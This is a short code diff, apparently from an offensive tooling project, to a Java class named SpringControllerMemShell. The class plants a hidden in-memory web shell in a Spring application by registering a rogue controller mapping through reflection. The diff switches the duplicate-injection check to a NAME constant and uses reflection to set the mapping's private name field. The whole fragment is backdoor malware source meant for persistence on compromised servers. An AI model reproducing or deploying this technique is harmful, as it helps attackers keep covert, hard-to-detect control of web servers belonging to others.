@@ -46,7 +46,7 @@ public class SpringControllerMemShell {
             List<String> urls = new ArrayList();
             while (urlIterator.hasNext()) {
                 String urlPath = (String) urlIterator.next();
-                if (PATTERN.equals(urlPath)) {
+                if (NAME.equals(urlPath)) {
                     return;
                 }
             }
@@ -57,6 +57,9 @@ public class SpringControllerMemShell {
             configField.setAccessible(true);
             RequestMappingInfo.BuilderConfiguration config = (RequestMappingInfo.BuilderConfiguration)configField.get(mapping);
             RequestMappingInfo requestMappingInfo = RequestMappingInfo.paths(new String[]{PATTERN}).options(config).build();
+            Field field1 = requestMappingInfo.getClass().getDeclaredField("name");
+            field1.setAccessible(true);
+            field1.set(requestMappingInfo, NAME);
 
             // 避免循环
             SpringControllerMemShell springControllerMemShell = new SpringControllerMemShell(NAME);
